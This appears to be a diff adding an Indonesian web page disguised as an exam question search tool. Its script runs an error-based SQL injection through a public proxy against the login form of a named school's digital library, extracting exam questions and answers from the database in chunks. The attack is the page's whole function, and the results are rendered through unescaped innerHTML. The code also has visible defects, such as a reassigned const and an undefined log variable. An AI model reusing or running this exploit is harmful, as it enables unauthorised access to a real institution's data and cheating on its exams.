@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <title>Search Soal</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="p-6 max-w-3xl mx-auto">
+
+  <h1 class="text-xl font-bold mb-4">Search Soal</h1>
+
+  <div class="flex gap-2 mb-4">
+    <input id="searchBox" 
+      type="text" 
+      placeholder="Ketik lalu tekan Enter atau klik Search"
+      class="flex-1 border rounded p-2" />
+    <button id="searchBtn"
+      class="bg-blue-600 text-white px-4 py-2 rounded">
+      Search
+    </button>
+  </div>
+
+  <table class="w-full border">
+    <thead>
+      <tr class="bg-gray-100">
+        <th class="border px-2 py-1 text-left">Soal</th>
+        <th class="border px-2 py-1 text-left">Jawaban</th>
+      </tr>
+    </thead>
+    <tbody id="tableBody"></tbody>
+  </table>
+
+<script>
+    const targetURL = "https://digilib.smktexmaco-smg.sch.id/login";
+    const proxy = "https://api.allorigins.win/raw?url=";
+
+    function delay(ms) {
+      return new Promise(resolve => setTimeout(resolve, ms));
+    }
+
+    async function req(payload, retries = 3) {
+      const data = new URLSearchParams();
+      data.append('nmapg_pgw', payload);
+      data.append('paspw_pgw', 'test');
+
+      try {
+        const response = await fetch(proxy + encodeURIComponent(targetURL), {
+          method: 'POST',
+          credentials: "omit",
+          headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+          },
+          body: data.toString(),
+          // kalau butuh cookie yang sudah tersimpan di browser:
+          credentials: 'include',
+        });
+
+        const dataa = await response.text();
+
+        const startIndex = dataa.indexOf("XPATH syntax error: '");
+        const endIndex = dataa.lastIndexOf("'</p>");
+
+        // perbaikan: cek !== -1
+        if (startIndex !== -1 && endIndex !== -1 && endIndex > startIndex) {
+          const ress = dataa.replace("\\", "").substring(startIndex + 21, endIndex - 1);
+          return ress;
+        }
+
+        return null;
+
+      } catch (error) {
+        console.error("REQ ERROR: ", error);
+
+        if (retries <= 0) {
+          return null;
+        }
+
+        console.log(`Retrying... (${retries - 1} left)`);
+        await delay(2000);
+        return req(payload, retries - 1);
+      }
+    }
+    
+  const data = [];
+
+  renderTable(data);
+
+  document.getElementById("searchBox").addEventListener("keydown", function (e) {
+    if (e.key === "Enter") doSearch();
+  });
+
+  document.getElementById("searchBtn").addEventListener("click", doSearch);
+
+  function doSearch() {
+    const q = document.getElementById("searchBox").value.toLowerCase();
+
+    getData(q).then((res) => {
+        renderTable(res);
+    });
+  }
+
+  async function getData(params) {
+    const payload = `' AND EXTRACTVALUE(1, CONCAT(0x5c, SUBSTRING((SELECT GROUP_CONCAT(CONCAT_WS(' |||| ', soal, jawaban) SEPARATOR ';') FROM siatex_ujianonlinedb.m_soal WHERE soal LIKE %${params}%), {sub1}, {sub2}))) -- -`;
+    const current = 1;
+    const length = 31;
+    const lengthPayload = payload.replace("SUBSTRING", "CHAR_LENGTH").replace(", {sub1}, {sub2}", "");
+    const lengthData = Number(await req(lengthPayload));
+    const steps = Math.floor(lengthData / length) < (lengthData / length) ? Math.floor(lengthData / length) + 1 : Math.floor(lengthData / length);
+    const _payload = payload.replace('{sub2}', length);
+
+    let data = {};
+    let currentStep = 0;
+
+    console.log(`CHAR: ${lengthData}`);
+    if (!lengthData) {
+        if (log) {
+            console.log('STOPPED!');
+            console.log(`Payload Length: ${lengthPayload}`);
+            console.log(`Payload Data: ${_payload}`);
+        }
+        return Object.values(data).join("");
+    }
+
+    const requestSize = 100;
+
+    for (let i = 0; i < steps; i+=requestSize) {
+
+        await new Promise((res) => {
+            let count = 0;
+            for (let _i = 0; _i < (steps - i < requestSize ? steps - i : requestSize); _i++) {
+                let index = i + _i;
+                const step = `${index}`;
+
+                if (log) console.log(`SEND: ${index + 1}/${steps}`);
+
+                const _reqPayload = _payload.replace('{sub1}', current);
+
+                req(_reqPayload).then((r) => {
+                    currentStep++;
+
+                    if (r === null && log) {
+                        console.log(`GET STEP [${step}]: Error!`);
+                        console.log(`Error! `, _reqPayload);
+                    }
+                    else {
+                        if (log) console.log(`GET: ${currentStep}/${steps} [${step}]`);
+                        data[Number(step)] = r;
+                    }
+                }).finally(() => {
+                    count++;
+                    if (count >= (steps - i < requestSize ? steps - i : requestSize)) {
+                        res(true);
+                    }
+                });
+
+                current += length;
+            }
+        });
+    }
+
+    const rawfile = Object.values(data).join("");
+
+    const lines = rawfile.split("\n").filter(line => line.trim() !== "");
+
+    let jsonData = [];
+
+    lines.slice(2).forEach((line) => {
+        const parts = line.split("||||").map(part => part.trim());
+
+        jsonData.push({
+            soal: parts[0],
+            jawaban: parts[1],
+        });
+    });
+
+    return jsonData;
+  }
+
+  function renderTable(list) {
+    const tbody = document.getElementById("tableBody");
+    tbody.innerHTML = "";
+
+    list.forEach(item => {
+      const tr = document.createElement("tr");
+      tr.innerHTML = `
+        <td class="border px-2 py-1">${item.soal}</td>
+        <td class="border px-2 py-1">${item.jawaban}</td>
+      `;
+      tbody.appendChild(tr);
+    });
+  }
+</script>
+
+</body>
+</html>
